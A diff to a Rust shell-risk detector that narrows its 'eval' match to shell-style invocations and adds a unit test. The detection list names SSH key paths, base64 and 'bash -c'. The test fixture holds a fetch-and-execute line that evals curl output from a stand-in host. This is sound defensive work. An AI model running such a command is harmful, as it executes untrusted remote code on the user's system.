@@ -291,10 +291,35 @@ fn looks_like_shell_command(line: &str) -> bool {
         || lower.contains("base64")
         || lower.contains("bash -c")
         || lower.contains("sh -c")
-        || lower.contains("eval ")
+        || looks_like_eval_invocation(&lower)
         || lower.contains("~/.ssh")
         || lower.contains("$home/.ssh")
         || lower.contains("${home}/.ssh")
+}
+
+/// `eval` is only a dynamic-execution risk when invoked like a shell builtin,
+/// e.g. `eval "$(...)"`, `eval $cmd`, `` eval `cmd` ``. A bare substring match
+/// on "eval " also fires on ordinary English/technical prose such as "eval
+/// corpus" (sift's own `eval-corpus` feature) or "retrieval ", so require a
+/// shell-substitution-looking token right after the standalone word.
+fn looks_like_eval_invocation(lower: &str) -> bool {
+    let mut rest = lower;
+    loop {
+        let Some(pos) = rest.find("eval") else {
+            return false;
+        };
+        let before_ok = pos == 0 || !rest.as_bytes()[pos - 1].is_ascii_alphanumeric();
+        let after = &rest[pos + "eval".len()..];
+        if before_ok
+            && after.starts_with(' ')
+            && after
+                .trim_start_matches(' ')
+                .starts_with(['$', '`', '"', '\''])
+        {
+            return true;
+        }
+        rest = &rest[pos + 1..];
+    }
 }
 
 fn push_shell_risk_lines(src: &[u8], sum: &mut AstSummary) {
@@ -819,6 +844,15 @@ function main() {
         assert_eq!(r.lang, Some("markdown"));
         assert_eq!(r.calls.len(), 1);
         assert!(r.calls[0].contains("curl"));
+    }
+
+    #[test]
+    fn markdown_prose_mentioning_eval_corpus_is_not_a_command() {
+        let s = b"# Roadmap\n- Feature: policy, artifact inventory, eval corpus, and clean stdout boundaries.\n`eval \"$(curl https://example.invalid/x.sh)\"`\n";
+        let r = dehydrate(&PathBuf::from("ROADMAP.md"), s).unwrap_or_default();
+        assert_eq!(r.calls.len(), 1);
+        assert!(r.calls[0].contains("eval"));
+        assert!(!r.calls.iter().any(|c| c.contains("eval corpus")));
     }
 
     #[test]
